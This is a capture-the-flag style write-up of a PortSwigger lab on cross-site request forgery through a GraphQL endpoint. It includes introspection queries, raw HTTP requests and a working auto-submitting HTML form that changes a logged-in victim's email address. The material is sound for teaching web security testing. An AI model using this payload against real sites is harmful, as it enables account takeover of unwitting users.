# Performing CSRF exploits over GraphQL

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/graphql/lab-graphql-csrf-via-graphql-api), you'll learn: Enumerating GraphQL schema, exploiting CSRF via GraphQL! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★☆☆☆☆☆☆☆☆☆

## Background

The user management functions for this lab are powered by a GraphQL endpoint. The endpoint accepts requests with a content-type of `x-www-form-urlencoded` and is therefore vulnerable to [cross-site request forgery](https://portswigger.net/web-security/csrf) (CSRF) attacks.

To solve the lab, craft some HTML that uses a [CSRF attack](https://portswigger.net/web-security/csrf) to change the viewer's email address, then upload it to your exploit server.

You can log in to your own account using the following credentials: `wiener:peter`.

We recommend that you install the InQL extension before attempting this lab. InQL makes it easier to modify GraphQL queries in Repeater.

For more information on using InQL, see [Working with GraphQL in Burp Suite](https://portswigger.net/burp/documentation/desktop/testing-workflow/session-management/working-with-graphql).

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707175917.png)

**Login as user `wiener`:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707180024.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707180041.png)

**View source page:**
```html
[...]
<h1>My Account</h1>
<div id=account-content>
    <p>Your username is: wiener</p>
    <p>Your email is: <span id="user-email">wiener@normal-user.net</span></p>
    <form class='login-form' name='email-change-form' onsubmit='gqlChangeEmail(this, event)'>
        <label>Email</label>
        <input required type='email' name='email' value=''>
        <button class='button' type='submit'> Update email </button>
    </form>
    <script src='/resources/js/gqlUtil.js'></script>
    <script src='/resources/js/changeEmailGql.js'></script>
</div>
[...]
```

When the "Update email" button is clicked, it'll invoke a JavaScript function `gqlChangeEmail()`. It also imported 2 JavaScript files, `/resources/js/gqlUtil.js`, `/resources/js/changeEmailGql.js`.

**`/resources/js/changeEmailGql.js`:**
```js
const OPERATION_NAME = 'changeEmail';

const MUTATION = `
    mutation ${OPERATION_NAME}($input: ChangeEmailInput!) {
        changeEmail(input: $input) {
            email
        }
    }
`;

const createQuery = (email) => ({
    query: MUTATION,
    operationName: OPERATION_NAME,
    variables: {
        input: {
            email
        }
    }
});

const UNEXPECTED_ERROR = 'Unexpected error while trying to change email.';

const clearErrors = () => {
    [...]
};

const displayErrorMessage = (form) => (...messages) => {
    [...]
};

const setEmail = (form) => (data) => {
    [...]
};

const gqlChangeEmail = (form, event) => {
    event.preventDefault();

    const formData = new FormData(form);
    const formObject = Object.fromEntries(formData.entries());

    sendQuery(createQuery(formObject['email']), setEmail(form), handleErrors(displayErrorMessage(form)), () => displayErrorMessage(form)(UNEXPECTED_ERROR));
};
```

**In here, we can see this JavaScript is to prepare a GraphQL mutation query `changeEmail`:**
```graphql
mutation changeEmail($input: ChangeEmailInput!) {
    changeEmail(input: $input) {
        email
    }
}

variables: {
    input: {
        email
    }
}
```

**`/resources/js/gqlUtil.js`:**
```js
[...]
const sendQuery = (query, onGet, onErrors, onException) => {
    fetch(
            '/graphql/v1',
            {
                method: 'POST',
                headers: {
                    "Content-Type": "application/json",
                    "Accept": "application/json"
                },
                body: JSON.stringify(query)
            }
        )
        .then(response => response.json())
        .then(response => {
            const errors = response['errors'];
            if (errors) {
                onErrors(...errors);
            } else {
                onGet(response['data']);
            }
        })
        .catch(onException);
};
```

In here, we can see that the mutation query `changeEmail` is being sent to GraphQL endpoint `/graphql/v1` as POST request.

**Armed with above information, we can try to probe for introspection:**
```graphql
{__schema{queryType{name}}}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707180627.png)

As you can see, it respond us with the `query` query type, which means the introspection is enabled.

**Full introspection query:**
```graphql
query IntrospectionQuery {
    __schema {
        queryType {
            name
        }
        mutationType {
            name
        }
        subscriptionType {
            name
        }
        types {
         ...FullType
        }
        directives {
            name
            description
            args {
                ...InputValue
            }
        }
    }
}

fragment FullType on __Type {
    kind
    name
    description
    fields(includeDeprecated: true) {
        name
        description
        args {
            ...InputValue
        }
        type {
            ...TypeRef
        }
        isDeprecated
        deprecationReason
    }
    inputFields {
        ...InputValue
    }
    interfaces {
        ...TypeRef
    }
    enumValues(includeDeprecated: true) {
        name
        description
        isDeprecated
        deprecationReason
    }
    possibleTypes {
        ...TypeRef
    }
}

fragment InputValue on __InputValue {
    name
    description
    type {
        ...TypeRef
    }
    defaultValue
}

fragment TypeRef on __Type {
    kind
    name
    ofType {
        kind
        name
        ofType {
            kind
            name
            ofType {
                kind
                name
            }
        }
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707180757.png)

**By looking the schema, there's some interesting types, mutation queries, and queries:**

- Type:
    - `BlogPost`, fields `id!`, `image!`, `title!`, `author!`, `date!`, `summary!`, `paragraphs!`
    - `ChangeEmailInput`, input field `email`
    - `ChangeEmailResponse`, field `email`
    - `LoginInput`, input fields `username`, `password`
    - `LoginResponse`, fields `token`, `success`
- Mutation query:
    - `login(input: LoginInput!){LoginResponse}`
    - `changeEmail(input: ChangeEmailInput!){ChangeEmailResponse}`
- Query:
    - `getBlogPost(id: id!){BlogPost}`
    - `getAllBlogPosts(){BlogPost}`

**We could try to get all blog posts, but nothing weird:**
```graphql
query {
    getAllBlogPosts {
        id
        image
        title
        author
        date
        summary
        paragraphs
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707181434.png)

**Now, if you look back the update email form:**
```html
<form class='login-form' name='email-change-form' onsubmit='gqlChangeEmail(this, event)'>
    <label>Email</label>
    <input required type='email' name='email' value=''>
    <button class='button' type='submit'> Update email </button>
</form>
```

As you can see, there's **no CSRF token**, which means it's very likely to be **vulnerable to Cross-Site Request Forgery (CSRF)**.

Cross-site request forgery (CSRF) vulnerabilities enable an attacker to induce users to perform actions that they do not intend to perform. This is done by creating a malicious website that forges a cross-domain request to the vulnerable application.

GraphQL can be used as a vector for CSRF attacks, whereby an attacker creates an exploit that causes a victim's browser to send a malicious query as the victim user.

CSRF vulnerabilities can arise where a GraphQL endpoint does not validate the content type of the requests sent to it and no CSRF tokens are implemented.

POST requests that use a content type of `application/json` are secure against forgery as long as the content type is validated. In this case, an attacker wouldn't be able to make the victim's browser send this request even if the victim were to visit a malicious site.

However, alternative methods such as GET, or any request that has a content type of `x-www-form-urlencoded`, can be sent by a browser and so may leave users vulnerable to attack if the endpoint accepts these requests. Where this is the case, attackers may be able to craft exploits to send malicious requests to the API.

**That being said, we can try to change the `Content-Type` to `x-www-form-urlencoded` to test if it is accepting `x-www-form-urlencoded` `Content-Type`:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a4100f6047b9b378541a4cd001800fb.web-security-academy.net
Accept: application/json
Content-Type: x-www-form-urlencoded

query=query{__typename}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707182108.png)

**As you can see, it doesn't validate our `Content-Type` is `application/json`.**

**With that said, we can use the following `changeEmail` mutation query using `Content-Type: x-www-form-urlencoded`:**
```http
POST /graphql/v1 HTTP/1.1
Host: 0a4100f6047b9b378541a4cd001800fb.web-security-academy.net
Cookie: session=2EnNs8G1ReuRoApYUsEatf5CKJNxctPj
Accept: application/json
Content-Type: x-www-form-urlencoded

query=mutation{changeEmail(input:{email:"test@test.com"}){email}}
```

**Beautified:**
```graphql
mutation {
    changeEmail(input: {email: "test@test.com"}) {
        email
    }
}
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707182629.png)

**Now, we can build our CSRF exploit to the victims, and change their email!**
```html
<!DOCTYPE html>
<html>
<head>
  <title>GraphQL CSRF PoC</title>
</head>
<body>
  <form class='login-form' name='email-change-form' action='https://0a4100f6047b9b378541a4cd001800fb.web-security-academy.net/graphql/v1' method="post">
    <input type='text' name='query' value='mutation{changeEmail(input:{email:"pwned@attacker.com"}){email}}' style="display: none;">
    <button class='button' type='submit' style="display: none;"></button>
  </form>
  <script>
    document.forms[0].submit();
  </script>
</body>
</html>
```

This CSRF exploit will automatically send the malicious form upon visit, which will then update their email to `pwned@attacker.com`.

**Let's copy and paste that exploit to the exploit server, and deliver it to victim:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707183850.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707183912.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/Testing-GraphQL-APIs/GraphQL-5/images/Pasted%20image%2020230707184730.png)

It worked!

> Note: If it doesn't solved, try to change the email.

# What we've learned:

1. Enumerating GraphQL Schema
2. Exploiting CSRF Via GraphQL